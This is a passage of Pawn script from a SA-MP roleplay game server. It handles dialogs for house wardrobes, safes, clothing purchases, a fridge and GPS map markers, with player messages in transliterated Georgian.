			format(query,sizeof(query),"UPDATE `houses` SET `improve` = '%s' WHERE id = '%d'",data,houseid+1);
			mysql_empty(mysql, query);
			if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL (Saxlis Gaumjobesebebis Damaxsovrebis Dros)");
			TransferMoney(playerid,-1,price);
			SendClientMessage(playerid,CGREEN,"Gilocavt, Tqven Gaaumjobeset Tqveni Saxli.");
		}
		case dStore:
		{
			if(!response) return true;
			switch(listitem)
			{
				case 0: //Берем оружие
				{
					new houseid = pData[playerid][pHouse]-1;
					new hintid = gHouses[houseid][houseHint];
					for(new i;i<9;i++)
					{
						if(gHouses[houseid][houseGun][i])
						{
							new Float:x, Float:y, Float:z, Float:x2, Float:y2, Float:z2;
							GetPlayerCameraPos(playerid,x,y,z);
							SetPVarFloat(playerid,"oldcx",x);
							SetPVarFloat(playerid,"oldcy",y);
							SetPVarFloat(playerid,"oldcz",z);
							GetGunCameraOffset(gHintGun[hintid][i][0],gHintGun[hintid][i][1],gHintStore[hintid][5],x2,y2);
							z2 = gHintGun[hintid][i][2] + 0.4;
							InterpolateCameraPos(playerid,x,y,z,x2,y2,z2,1000,CAMERA_MOVE);
							GetPlayerCameraFrontVector(playerid,x2,y2,z2);
							x += x2;
							y += y2;
							z += z2;
							InterpolateCameraLookAt(playerid,x,y,z,gHintGun[hintid][i][0],gHintGun[hintid][i][1],gHintGun[hintid][i][2],1000,CAMERA_MOVE);
							SetPVarInt(playerid,"SelectStoreGun",1);
							pTemp[playerid][pStoreGun] = i;
							SetPVarInt(playerid,"SelectStoreGun",0);
							SetTimerEx("SelectStoreGun",1000,false,"i",playerid);
							new gunname[32];
							GetWeaponName(GetStoreGunID(i),gunname,32);
							format(mes,48,"~w~%s (~g~%d~w~)",gunname,gHouses[houseid][houseGun][i]);
							GameTextForPlayer(playerid,mes,100000,3);
							TogglePlayerControllable(playerid,0);
							for(new di = 0; di < 4; di++) TextDrawShowForPlayer(playerid,Dallee[di]);
							SelectTextDraw(playerid,CYELLOW);
							return true;
						}
					}
					return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Tansacmeli Karadashi");
				}
				case 1: ShowGunList(playerid);
				case 2: //Одежду
				{
					new houseid = pData[playerid][pHouse] - 1;
					new cnt;
					new mes2[128];
					for(new i;i<4;i++)
					{
						if(i == 3 && pData[playerid][pFractionSkin]) format(mes2,sizeof(mes2),"%sOrganizaciis Tansacmeli",mes2);
						else if(gHouses[houseid][houseSkin][i])
						{
							format(mes2,sizeof(mes2),"%sTansacmeli %d\n",mes2,i+1);
						}
						else continue;
						cnt++;
					}
					if(!cnt)
					{
						SendClientMessage(playerid,CGRAY,"Karadashi Ar Aris Tansacmeli");
						return ShowPlayerDialog(playerid,dStore,2,"{"#cGREEN"}Karada: {ffffff}Airchie","1. Aige Iaragi\n2. Dade Iaragi\n3. Aige Tansacmeli\n4. Fuli Da Narkotiki","NEXT","CLOSE");
					}
					ShowPlayerDialog(playerid,dStoreSkin,2,"Karada",mes2,"Chacma","Daxurva");
				}
				case 3:
				{
				    new houseid = pData[playerid][pHouse] - 1, mes2[128];
					format(mes2,sizeof(mes2),"{"#cWHITE"}Settings [{"#cGREEN"}%d{"#cWHITE"}]\nFuli [{"#cGREEN"}%d${"#cWHITE"}]",gHouses[houseid][houseDrugs],gHouses[houseid][houseSafeMoney]);
					return ShowPlayerDialog(playerid,dSafe,0,"Seifi",mes2,"NEXT","CLOSE");
				}
			}
		}
 	    case dSafe:
		{
			if(!response) return true;
			else ShowPlayerDialog(playerid,dSafeAction,2,"{"#cGREEN"}Karada: {ffffff}Airchie","1. Dade Fuli\n2. Aige Fuli\n3. Dade Narkotiki\n4. Aige Narkotiki","OK","CLOSE");
		}
		case dSafeAction:
		{
			if(!response)
			{
				new houseid = pData[playerid][pHouse] - 1;
				format(mes,sizeof(mes),"{"#cWHITE"}Narkotiki [{"#cGREEN"}%d{"#cWHITE"}]\nFuli [{"#cGREEN"}%d${"#cWHITE"}]",gHouses[houseid][houseDrugs],gHouses[houseid][houseSafeMoney]);
				return ShowPlayerDialog(playerid,dSafe,0,"{"#cGREEN"}Karada: {ffffff}Informacia",mes,"NEXT","CLOSE");
			}
			switch(listitem)
			{
				case 0:	ShowPlayerDialog(playerid,dSafePutMoney,1,"{"#cGREEN"}Karada: {ffffff}Airchie","{"#cWHITE"}Miutitet Tanxa, Romlis Shenaxvac Gindat Karadashi:","Shenaxva","Daxurva");
				case 1: ShowPlayerDialog(playerid,dSafeGetMoney,1,"{"#cGREEN"}Karada: {ffffff}Airchie","{"#cWHITE"}Miutitet Tanxa, Romlis Agebac Gindat Karadidan:","Ageba","Daxurva");
				case 2: ShowPlayerDialog(playerid,dSafePutDrug,1,"{"#cGREEN"}Karada: {ffffff}Airchie","{"#cWHITE"}Miutitet Narkotikebis Raodenoba, Romlis Shenaxvac Gsurt Karadashi","Shenaxva","Daxurva");
				case 3: ShowPlayerDialog(playerid,dSafeGetDrug,1,"{"#cGREEN"}Karada: {ffffff}Airchie","{"#cWHITE"}Miutitet Narkotikebis Raodenoba, Romlis Agebac Gsurt Karadidan","Ageba","Daxurva");
			}
		}
		case dSafePutMoney:
		{
			if(!response) ShowPlayerDialog(playerid,dStore,2,"{"#cGREEN"}Karada: {ffffff}Airchie","1. Aige Iaragi\n2. Dade Iaragi\n3. Aige Tansacmeli\n4. Fuli Da Narkotiki","NEXT","CLOSE");
			new money = strval(inputtext);
			if(money < 1 || money > 9000000)
			{
				SendClientMessage(playerid,CGRAY,"Araswori Raodenoba");
				return ShowPlayerDialog(playerid,dStore,2,"{"#cGREEN"}Karada: {ffffff}Airchie","1. Aige Iaragi\n2. Dade Iaragi\n3. Aige Tansacmeli\n4. Fuli Da Narkotiki","NEXT","CLOSE");
			}
			if(GetPlayerMoneyEx(playerid) < money)
			{
				SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Sakmarisi Tanxa.");
				return ShowPlayerDialog(playerid,dStore,2,"{"#cGREEN"}Karada: {ffffff}Airchie","1. Aige Iaragi\n2. Dade Iaragi\n3. Aige Tansacmeli\n4. Fuli Da Narkotiki","NEXT","CLOSE");
			}
			new houseid = pData[playerid][pHouse] - 1;
			new query[128];
			format(query,sizeof(query),"UPDATE `houses` SET `safemoney` = '%d' WHERE id = '%d'",gHouses[houseid][houseSafeMoney]+money,houseid+1);
			mysql_empty(mysql, query);
			if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL Fulis Seifshi Shenaxvis Dros");
			gHouses[houseid][houseSafeMoney] += money;
			TransferMoney(playerid,-1,money);
			MeAction(playerid,"Sheinaxa Fuli Karadashi");
			ShowPlayerDialog(playerid,dStore,2,"{"#cGREEN"}Karada: {ffffff}Airchie","1. Aige Iaragi\n2. Dade Iaragi\n3. Aige Tansacmeli\n4. Fuli Da Narkotiki","NEXT","CLOSE");
		}
		case dSafeGetMoney:
		{
			if(!response) ShowPlayerDialog(playerid,dStore,2,"{"#cGREEN"}Karada: {ffffff}Airchie","1. Aige Iaragi\n2. Dade Iaragi\n3. Aige Tansacmeli\n4. Fuli Da Narkotiki","NEXT","CLOSE");
			new money = strval(inputtext);
			new houseid = pData[playerid][pHouse] - 1;
			if(money < 1 || money > 9000000) SendClientMessage(playerid,CGRAY,"Tanxis Raodenoba Unda Iyos 1-Dan 9000000-Mde");
			else if(money > gHouses[houseid][houseSafeMoney]) SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Sakmarisi Tanxa Karadashi.");
			else
			{
				new query[128];
				format(query,sizeof(query),"UPDATE `houses` SET `safemoney` = '%d' WHERE id = '%d'",gHouses[houseid][houseSafeMoney]-money,houseid+1);
				mysql_empty(mysql, query);
				if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL Fulis Seifshi Shenaxvis Dros");
				gHouses[houseid][houseSafeMoney] -= money;
				TransferMoney(-1,playerid,money);
				MeAction(playerid,"Aigo Fuli Karadidan");
			}
			ShowPlayerDialog(playerid,dStore,2,"{"#cGREEN"}Karada: {ffffff}Airchie","1. Aige Iaragi\n2. Dade Iaragi\n3. Aige Tansacmeli\n4. Fuli Da Narkotiki","NEXT","CLOSE");
		}
		case dSafePutDrug:
		{
			if(!response) ShowPlayerDialog(playerid,dStore,2,"{"#cGREEN"}Karada: {ffffff}Airchie","1. Aige Iaragi\n2. Dade Iaragi\n3. Aige Tansacmeli\n4. Fuli Da Narkotiki","NEXT","CLOSE");
			new drug = strval(inputtext);
			new houseid = pData[playerid][pHouse] - 1;
			if(drug < 1) SendClientMessage(playerid,CGRAY,"Tqven Ar Shegidzliat Sheinaxot 1g-Ze Meti. Narkotiki Karadashi");
			else if(pData[playerid][pDrugs] < drug) SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Sakmarisi Narkotiki.");
			else
			{
				new query[128];
				format(query,sizeof(query),"UPDATE `houses` SET `drugs` = '%d' WHERE id = '%d'",gHouses[houseid][houseDrugs]+drug,houseid+1);
				mysql_empty(mysql, query);
				if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL Narkotikis Seifshi Shenaxvis Dros");
				gHouses[houseid][houseDrugs] += drug;
				pData[playerid][pDrugs] -= drug;
				UpdatePlayerData(playerid, "drugs", pData[playerid][pDrugs]);
				Pokaz(playerid,4,drug,0);
				MeAction(playerid,"Sheinaxa Narkotiki Karadashi");
			}
			ShowPlayerDialog(playerid,dStore,2,"{"#cGREEN"}Karada: {ffffff}Airchie","1. Aige Iaragi\n2. Dade Iaragi\n3. Aige Tansacmeli\n4. Fuli Da Narkotiki","NEXT","CLOSE");
		}
		case dSafeGetDrug:
		{
			if(!response) ShowPlayerDialog(playerid,dStore,2,"{"#cGREEN"}Karada: {ffffff}Airchie","1. Aige Iaragi\n2. Dade Iaragi\n3. Aige Tansacmeli\n4. Fuli Da Narkotiki","NEXT","CLOSE");
			new drug = strval(inputtext);
			new houseid = pData[playerid][pHouse] - 1;
			if(drug < 1) SendClientMessage(playerid,CGRAY,"Tqven Ar Shegidzliat Aigot 1g-Ze Meti. Narkotiki Karadidan");
			else if(gHouses[houseid][houseDrugs] < drug) SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Sakmarisi Narkotiki Karadashi.");
			else
			{
				new query[128];
				format(query,sizeof(query),"UPDATE `houses` SET `drugs` = '%d' WHERE id = '%d'",gHouses[houseid][houseDrugs]-drug,houseid+1);
				mysql_empty(mysql, query);
				if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL Narkotikis Karadashi Shenaxvis Dros");
				gHouses[houseid][houseDrugs] -= drug;
				pData[playerid][pDrugs] += drug;
				UpdatePlayerData(playerid, "drugs", pData[playerid][pDrugs]);
				Pokaz(playerid,4,drug,1);
				MeAction(playerid,"Aigo Narkotiki Karadidan");
			}
		}
		case dStoreSkin:
		{
			if(!response) return ShowPlayerDialog(playerid,dStore,2,"{"#cGREEN"}Karada: {ffffff}Airchie","1. Aige Iaragi\n2. Dade Iaragi\n3. Aige Tansacmeli\n4. Fuli Da Narkotiki","NEXT","CLOSE");
			new skin,id;
			new mes2[128];
			new houseid = pData[playerid][pHouse] - 1;
			if(!strcmp(inputtext,"Organizaciis Tansacmeli",false)) skin = pData[playerid][pFractionSkin];
			else
			{
				sscanf(inputtext,"{s[100]}i",id);
				skin = gHouses[houseid][houseSkin][id-1];
				pData[playerid][pSkin] = skin;
				UpdatePlayerData(playerid, "skin", skin);
			}
			SetPlayerSkin(playerid,skin);
			MeAction(playerid,"Gamoicvala");
			new cnt;
			for(new i;i<4;i++)
			{
				if(i == 3 && pData[playerid][pFractionSkin]) format(mes2,sizeof(mes2),"%sOrganizaciis Tansacmeli",mes2);
				else if(gHouses[houseid][houseSkin][i]) format(mes2,sizeof(mes2),"%sTansacmeli %d\n",mes2,i+1);
				else continue;
				cnt ++;
			}
			if(!cnt)
			{
				SendClientMessage(playerid,CGRAY,"Karadashi Ar Aris Tansacmeli");
				return ShowPlayerDialog(playerid,dStore,2,"{"#cGREEN"}Karada: {ffffff}Airchie","1. Aige Iaragi\n2. Dade Iaragi\n3. Aige Tansacmeli\n4. Fuli Da Narkotiki","NEXT","CLOSE");
			}
			ShowPlayerDialog(playerid,dStoreSkin,2,"Karada",mes2,"Chacma","Daxurva");
		}
		case dStorePut:
		{
			if(!response) return ShowPlayerDialog(playerid,dStore,2,"{"#cGREEN"}Karada: {ffffff}Airchie","1. Aige Iaragi\n2. Dade Iaragi\n3. Aige Tansacmeli\n4. Fuli Da Narkotiki","NEXT","CLOSE");
			new cnt;
			new houseid = pData[playerid][pHouse]-1;
			for(new i;i<=11;i++)
			{
				new gunid,ammo,storeslot;
				GetPlayerWeaponData(playerid,i,gunid,ammo);
				storeslot = GetStoreGunSlot(gunid);
				if(!gunid || storeslot == -1 || ammo <= 0) continue;
				if(gunid == 23 && GetPVarInt(playerid,"TazerGun") == 1) continue;
				if(listitem == cnt)
				{
					new cnt2;
					for(new i2;i2<9;i2++) if(gHouses[houseid][houseGun][i2] && storeslot != i2) cnt2++;
					if(cnt2 >= 3)
					{
						SendClientMessage(playerid,CGRAY,"Tqven Ar Shegidzliat 3 Tipis Iaragze Metis Shenaxva Karadashi.");
						return ShowPlayerDialog(playerid,dStore,2,"{"#cGREEN"}Karada: {ffffff}Airchie","1. Aige Iaragi\n2. Dade Iaragi\n3. Aige Tansacmeli\n4. Fuli Da Narkotiki","NEXT","CLOSE");
					}
					if(gHouses[houseid][houseGun][storeslot] + ammo > 5000) return SendClientMessage(playerid,CWHITE,"Tqven Karadashi Gaqvt Tyviebis Maximaluri Raodenoba Iaragistvis");
					gHouses[houseid][houseGun][storeslot] += ammo;
	    			SaveStoreGun(houseid);
					UpdateHouseGun(houseid);
					SetPlayerAmmoEx(playerid,gunid,0);
					MeAction(playerid,"Sheinaxa Iaragi Karadashi");
					SendClientMessage(playerid,CGREEN,"Tqven Sheinaxet Iaragi Karadashi");
					break;
				}
				cnt++;
			}
		}
		case dStoreGet:
		{
			if(!response) return ShowPlayerDialog(playerid,dStore,2,"{"#cGREEN"}Karada: {ffffff}Airchie","1. Aige Iaragi\n2. Dade Iaragi\n3. Aige Tansacmeli\n4. Fuli Da Narkotiki","NEXT","CLOSE");
			new ammo = strval(inputtext);
			new storeslot = pTemp[playerid][pStoreGun];
			new houseid = pData[playerid][pHouse] - 1;
			if(ammo < 1)
			{
				new gunname[32];
				GetWeaponName(gHintGunID[storeslot],gunname,32);
				format(mes,sizeof(mes),"{"#cWHITE"}Miutitet Ramdeni Tyviis{"#cGREEN"}%s{"#cWHITE"} Ageba Gsurt:");
				ShowPlayerDialog(playerid,dStoreGet,1,"Karada",mes,"Ageba","Daxurva");
				return SendClientMessage(playerid,CGRAY,"Ar Sheidzleba 1 Vaznaze Naklebis Ageba");
			}
			if(ammo > gHouses[houseid][houseGun][storeslot])
			{
				new gunname[32];
				GetWeaponName(gHintGunID[storeslot],gunname,32);
				format(mes,sizeof(mes),"{"#cWHITE"}Miutitet Ramdeni Tyviis{"#cGREEN"}%s{"#cWHITE"} Ageba Gsurt:");
				ShowPlayerDialog(playerid,dStoreGet,1,"Karada",mes,"Ageba","Daxurva");
				return SendClientMessage(playerid,CGRAY,"Arasakmarisi Tyviebis Raodenoba Karadashi");
			}
			gHouses[houseid][houseGun][storeslot] -= ammo;
			SaveStoreGun(houseid);
			UpdateHouseGun(houseid);
			GivePlayerWeaponEx(playerid,GetStoreGunID(storeslot),ammo);
			GameTextForPlayer(playerid," ",100,3);
			MeAction(playerid,"Aigo Iaragi Da Tyviebi Karadidan");
			new Float:x, Float:y, Float:z, Float:x1, Float:y1, Float:z1;
			x = GetPVarFloat(playerid,"oldcx");
			y = GetPVarFloat(playerid,"oldcy");
			z = GetPVarFloat(playerid,"oldcz");
			GetPlayerCameraPos(playerid,x1,y1,z1);
			InterpolateCameraPos(playerid,x1,y1,z1,x,y,z,700,CAMERA_MOVE);
			SetTimerEx("SetCameraBehindPlayerDelay",1000,false,"i",playerid);
			SetPVarInt(playerid,"SelectStoreGun",0);
			pTemp[playerid][pStoreGun] = 0;
			GameTextForPlayer(playerid," ",100,3);
			TogglePlayerControllable(playerid,1);
			for(new i = 0; i < 4; i++) TextDrawHideForPlayer(playerid,Dallee[i]);
            CancelSelectTextDraw(playerid);
		}
		case dBuySkin:
		{
			if(!response) return true;
			new houseid = pData[playerid][pHouse]-1;
			if(!pData[playerid][pHouse] || !gHouses[houseid][houseImprove][1] || ((houseid+1) > 0 && !GetString(Name2(playerid),gHouses[houseid][houseOwner]))) ShowPlayerDialog(playerid,dBuySkin2,0,"Tansacmlis Yidva","{"#cRED"}Yuradgeba! {"#cWHITE"}Tqven Ar Gaqvt Tansacmlis Karada.\nTu Tqven Iyidit Am Tansacmels, Is Chaanacvlebs Ukve Arsebuls.\nMainc Gsurt Sheidzinot Archeuli Tansacmeli?","YES","NO");
			else
			{
				new skinid = GetPVarInt(playerid,"clothes_select");
				new skin = gSkins[skinid][skinID];
				new price = GetSkinPrice(skinid);
				new id = pTemp[playerid][pSelectedBusinessID];
				new slot=-1;
				for(new i;i<3;i++)
				{
					if(skin == gHouses[houseid][houseSkin][i]) return SendClientMessage(playerid,CGRAY,"Tqven Ukve Gaqvt Es Tansacmeli Karadashi.");
					if(!gHouses[houseid][houseSkin][i]) {slot = i; break;}
				}
				if(slot == -1) return ShowPlayerDialog(playerid,dBuySkin2,0,"Tansacmlis Yidva","{"#cRED"}Yuradgeba! {"#cWHITE"}Tqven Ar Gaqvt Sakmarisi Adgili Karadashi.\nTu Tqven Iyidit Am Tansacmels, Is Chaanacvlebs Ukve Arsebuls.\nMainc Gsurt Sheidzinot Archeuli Tansacmeli?","YES","NO");
				if(GetPlayerMoneyEx(playerid) < price) return SendClientMessage(playerid,CGRAY,"Arasakmarisi Tanxa");
				if(gBusiness[id][busiProduct] - floatround((price / 100) * 10) / 10 <= 0) return SendClientMessage(playerid, CGRAY, "Bizneshi Arasakmarisi Produqtia.");
				gBusiness[id][busiBank] += floatround((price / 100) * 10);
				gBusiness[id][busiProduct] -= floatround((price / 100) * 10) / 20;
				UpdateBusinessText(id);
				UpdateBusinessDataEx(id+1,"product",gBusiness[id][busiProduct],"bank",gBusiness[id][busiBank]);
				gHouses[houseid][houseSkin][slot] = skin;
				UpdateHouseDress(houseid);
				if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma Mysql (Tansacmlis Karadashi Damaxsovrebisas)");
				TransferMoney(playerid,-1,price);
				SendClientMessage(playerid,CGREEN,"Tansacmeli Daido Tqvens Karadashi");
				SetPVarInt(playerid,"ChangingSkin",0);
				if(GetPVarInt(playerid, "curskin") == pData[playerid][pFractionSkin] || (!(houseid+1) || ((houseid+1) > 0 && gHouses[houseid][houseOwnerID] != pData[playerid][pMysqlID])) && pData[playerid][pFraction]) SetPlayerSkin(playerid, GetPVarInt(playerid, "curskin"));
				else pData[playerid][pSkin] = skin, SetPlayerSkin(playerid,skin);

				HidePlayerClothesTD(playerid);
				SetPVarInt(playerid,"JustTP",1);
				SetPlayerPos(playerid, GetPVarFloat(playerid, "posx"), GetPVarFloat(playerid, "posy"), GetPVarFloat(playerid, "posz"));
				SetPlayerInterior(playerid, GetPVarInt(playerid, "interior"));
				SetPlayerVirtualWorld(playerid, GetPVarInt(playerid, "vw"));
				SetPlayerFacingAngle(playerid, GetPVarInt(playerid, "posa"));
				TogglePlayerControllable(playerid, 1);
				SetCameraBehindPlayer(playerid);
				DeletePVar(playerid, "posx");
				DeletePVar(playerid, "posy");
				DeletePVar(playerid, "posz");
				DeletePVar(playerid, "posa");
				DeletePVar(playerid, "interior");
				DeletePVar(playerid, "vw");
				DeletePVar(playerid, "clothes_sel");
				DeletePVar(playerid, "clothes_class");
				SetPVarInt(playerid,"ChangingSkin",0);
			}
		}
		case dBuySkin2:
		{
			if(!response) return true;
			new skin;
			new skinid = GetPVarInt(playerid,"clothes_select");
			new houseid = pData[playerid][pHouse]-1;
			skin = gSkins[skinid][skinID];
			new price = GetSkinPrice(skinid);
			new id = pTemp[playerid][pSelectedBusinessID];
			if(GetPlayerMoneyEx(playerid) < price) return SendClientMessage(playerid,CGRAY,"Недостаточно денег");
			if(gBusiness[id][busiProduct] - floatround((price / 100) * 10) / 10 <= 0) return SendClientMessage(playerid, CGRAY, "Bizneshi Arasakmarisi Produqtia.");
			gBusiness[id][busiBank] += floatround((price / 100) * 10);
			gBusiness[id][busiProduct] -= floatround((price / 100) * 10) / 10;
			UpdateBusinessText(id);
			UpdateBusinessDataEx(id+1,"product",gBusiness[id][busiProduct],"bank",gBusiness[id][busiBank]);
			if(houseid+1)
			{
			    if(GetString(Name2(playerid),gHouses[houseid][houseOwner]))
			    {
					new slot=-1, cnt;
					for(new i;i<3;i++)
					{
						if(gHouses[houseid][houseSkin][i]) cnt++;
						if(gHouses[houseid][houseSkin][i] == pData[playerid][pSkin]) slot = i;
					}
					if(cnt >= 3)
					{
						if(slot == -1) return SendClientMessage(playerid,CRED,"Shecdoma Meore Tansacmelis Dadebisas Karadashi.");
						gHouses[houseid][houseSkin][slot] = skin;
						UpdateHouseDress(houseid);
					}
				}
				//printf("cnt: %d slot:%d",cnt,slot);
			}
			if(UpdatePlayerData(playerid,"skin",skin)) return SendClientMessage(playerid,CRED,"Shecdoma MySQL (Skinis Damaxsovrebisas Profilshi)");
			TransferMoney(playerid,-1,price);
			pData[playerid][pSkin] = skin;
			SetPVarInt(playerid,"ChangingSkin",0);
			if(GetPVarInt(playerid, "curskin") == pData[playerid][pFractionSkin] || (!(houseid+1) || ((houseid+1) > 0 && gHouses[houseid][houseOwnerID] != pData[playerid][pMysqlID])) && pData[playerid][pFraction]) SetPlayerSkin(playerid, GetPVarInt(playerid, "curskin"));
			else SetPlayerSkin(playerid,pData[playerid][pSkin]);

			HidePlayerClothesTD(playerid);
			SetPVarInt(playerid,"JustTP",1);
			SetPlayerPos(playerid, GetPVarFloat(playerid, "posx"), GetPVarFloat(playerid, "posy"), GetPVarFloat(playerid, "posz"));
			SetPlayerInterior(playerid, GetPVarInt(playerid, "interior"));
			SetPlayerVirtualWorld(playerid, GetPVarInt(playerid, "vw"));
			SetPlayerFacingAngle(playerid, GetPVarInt(playerid, "posa"));
			TogglePlayerControllable(playerid, 1);
			SetCameraBehindPlayer(playerid);
			DeletePVar(playerid, "posx");
			DeletePVar(playerid, "posy");
			DeletePVar(playerid, "posz");
			DeletePVar(playerid, "posa");
			DeletePVar(playerid, "interior");
			DeletePVar(playerid, "vw");
			DeletePVar(playerid, "clothes_sel");
			DeletePVar(playerid, "clothes_class");
			SetPVarInt(playerid,"ChangingSkin",0);
		}
		case dFreez:
		{
			if(!response) return true;
			new products,name[24];
			switch(listitem)
			{
				case 0: {products = 10; strcat(name,"хот-дог");}
				case 1: {products = 15; strcat(name,"бургер");}
				case 2: {products = 30; strcat(name,"пиццу");}
			}
			new houseid = pData[playerid][pHouse] - 1;
			if(gHouses[houseid][houseProducts] < products)
			{
				SFCM(playerid,CGRAY,"Tqven Ar Gaqvt Sakmarisi Produqti Macivarshi. %d/%d",gHouses[houseid][houseProducts],products);
				ShowPlayerDialog(playerid,dFreez,2,"Macivari","Hot-Dog ({"#cRED"}-10 Prod{"#cWHITE"})\nBurger ({"#cRED"}-15 Prod{"#cWHITE"})\nPizza ({"#cRED"}-30 Prod{"#cWHITE"})","Chama","Daxurva");
				return true;
			}
			new query[128];
			format(query,sizeof(query),"UPDATE `houses` SET `products` = '%d' WHERE `id` = '%d'",gHouses[houseid][houseProducts]-products,houseid+1);
			mysql_empty(mysql, query);
			if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL 1 (Sakvebis Chamisas)");
			gHouses[houseid][houseProducts] -= products;
			SFCM(playerid,CINFO,"Rom Chamot Gamoiyenet: {"#cWHITE"}/eat{"#cINFO"}. Darchenilia %d Produqti",gHouses[houseid][houseProducts]);
			format(mes,sizeof(mes),"Gamoigo %s Macivridan",name);
			MeAction(playerid,mes);
			if(listitem == 1) SetPlayerAttachedObject(playerid,0,2214,3,0.232999,-0.376998,-0.408999,54.199886,-35.700153,-35.000019,1.000000,1.000000,1.000000);
			else if(listitem == 2) SetPlayerAttachedObject(playerid,0,2220,3,0.232999,-0.376998,-0.408999,54.199886,-35.700153,-35.000019,1.000000,1.000000,1.000000);
			else if(!listitem) SetPlayerAttachedObject(playerid,0,19346,6,0.059000,0.059999,0.000000,-97.399963,0.000000,0.000000);
			if(listitem) SetPlayerSpecialAction(playerid, 25);
			pTemp[playerid][pEat] = listitem+1;
		}
		case dGPS:
		{
			if(!response) return true;
			switch(listitem)
			{
				case 0:	ShowPlayerDialog(playerid,dGPSWork,2,"{"#cGREEN"}Ruka: {ffffff}Airchie Adgili","1. Avtosheketeba\n2. Mshenebloba\n3. Merkinigze\n4. Samkervalo Fabrika\n5. Taqsisti\n6. Meqaniki\n7. Saerto Sabrdzolo Masala [Mxolod Policia, Armia]","Monishvna","Ukan");
				case 1: ShowPlayerDialog(playerid,dGPSMain,2,"{"#cGREEN"}Ruka: {ffffff}Airchie Adgili","1. Aeroporti\n2. Avtoskola\n3. Banki\n4. Tune LS\n5. Tune SF\n6. Tune LV\n7. Meria\n8. Universiteti\n9. Hospital LS\n10. Hospital SF\n11. Hospital LV\n12. Police LS\n13. Police SF\n14. Police LV\n15. Samxedro Komisariati\n16. Kazino\n17. Cixe\n18. Eklesia\n19. Sastumro LS\n20. Sastumro SF\n21. Sastumro LV\n22. Tir LS\n23. Tir SF","Monishvna","Ukan");
				case 2:
				{
				    SetPlayerCheckpoint(playerid, -1641.4983,1203.4303,7.2464,8);
				    SetPVarInt(playerid,"GPS",1);
					SendClientMessage(playerid,0xFFFF00FF,"Adgili Moinishna Tqvens Rukaze.");
				}
				case 3:
				{
					DisablePlayerCheckpoint(playerid);
					RemovePlayerAttachedObject(playerid, 5);
					SetPVarInt(playerid,"GPS",0);
					SendClientMessage(playerid,CRED,"Ruka Moshorda.");
				}
			}
		}
		case dGPSWork:
		{
			if(!response) return ShowPlayerDialog(playerid,dGPS,2,"{"#cGREEN"}Ruka: {ffffff}Airchie Adgili","1. Samushao\n2. Xalxmravali Adgilebi\n3. Avtobazroba\n4. Rukis Moshoreba","Arhceva","Gasvla");
			switch(listitem)
			{
			    case 0: SetPlayerCheckpoint(playerid, -88.5049,-308.9825,1.4297,8);
			    case 1: SetPlayerCheckpoint(playerid, 2455.2207,1948.4336,10.2781,8);
			    case 2: SetPlayerCheckpoint(playerid, 2139.2783,-1990.9692,13.5469,8);
			    case 3: SetPlayerCheckpoint(playerid, 1227.8615,181.5498,20.4099,8);
				case 4: SetPlayerCheckpoint(playerid,1273.2477,-1824.2330,13.3853,4.0); //Таксисит
				case 5: SetPlayerCheckpoint(playerid,1639.0933,-1108.6403,23.9140,4.0); // БУКСИРЫ
				case 6: SetPlayerCheckpoint(playerid,-1715.0265,60.4164,3.5495,4.0); // сбор беоприпасов
			}
			SetPVarInt(playerid,"GPS",1);
			SendClientMessage(playerid,0xFFFF00FF,"Adgili Moinishna Tqvens Rukaze.");
		}
		case dGPSMain:
		{
			if(!response) return ShowPlayerDialog(playerid,dGPS,2,"{"#cGREEN"}Ruka: {ffffff}Airchie Adgili","1. Samushao\n2. Xalxmravali Adgilebi\n3. Avtobazroba\n4. Rukis Moshoreba","Arhceva","Gasvla");
			switch(listitem)
			{
				case 0: SetPlayerCheckpoint(playerid,1685.8225,-2330.1467,13.5255,4.0); //Aeroporti
				case 1: SetPlayerCheckpoint(playerid,606.5971,-1459.5380,14.3969,4.0); //Avtoskola
				case 2: SetPlayerCheckpoint(playerid,1422.0151,-1631.7119,13.5469,4.0); //Banki
				case 3: SetPlayerCheckpoint(playerid,1015.3531,-1438.2787,13.5469,4.0); //СТО LS
				case 4: SetPlayerCheckpoint(playerid,-1917.2198,295.4781,41.0469,4.0); //СТО SF
				case 5: SetPlayerCheckpoint(playerid,2384.6409,1026.9692,10.8203,4.0); //СТО LV
				case 6: SetPlayerCheckpoint(playerid,1481.1857,-1740.9348,13.5495,4.0); //Meria
				case 7: SetPlayerCheckpoint(playerid,1382.1483,-1088.7728,28.2118,4.0); //Universiteti
				case 8: SetPlayerCheckpoint(playerid,1172.0792,-1323.3489,15.4030,4.0); // Больница LS
				case 9: SetPlayerCheckpoint(playerid,-2655.1638,639.8657,14.4545,4.0); // Больница SF
				case 10: SetPlayerCheckpoint(playerid,1583.5775,1769.1208,10.8203,4.0); // Больница LV
				case 11: SetPlayerCheckpoint(playerid,1542.5919,-1676.4452,13.5548,4.0); // Полиция LS
				case 12: SetPlayerCheckpoint(playerid,-1605.0452,720.4929,11.8777,4.0); // Полиция SF
				case 13: SetPlayerCheckpoint(playerid,2286.6794,2426.7869,10.8203,4.0); // Полиция LV
				case 14: SetPlayerCheckpoint(playerid,937.9644,-1735.8070,13.5546,4.0); // Военкомат
				case 15: SetPlayerCheckpoint(playerid,2163.6724,2060.5046,10.8203,4.0); // КАЗИНО
				case 16: SetPlayerCheckpoint(playerid,3440.9155,-684.6065,10.9669,4.0); // ТЮРЬМА
				case 17: SetPlayerCheckpoint(playerid,2224.8792,2522.1580,10.8203,4.0); // ЦЕРКОВЬ
				case 18: SetPlayerCheckpoint(playerid,325.0884,-1515.3992,36.0325,4.0); // ОТЕЛЬ ЛС
				case 19: SetPlayerCheckpoint(playerid,-2463.4446,131.7308,35.1719,4.0); // ОТЕЛЬ СФ
				case 20: SetPlayerCheckpoint(playerid,2628.0029,2349.3127,10.8203,4.0); // ОТЕЛЬ ЛВ
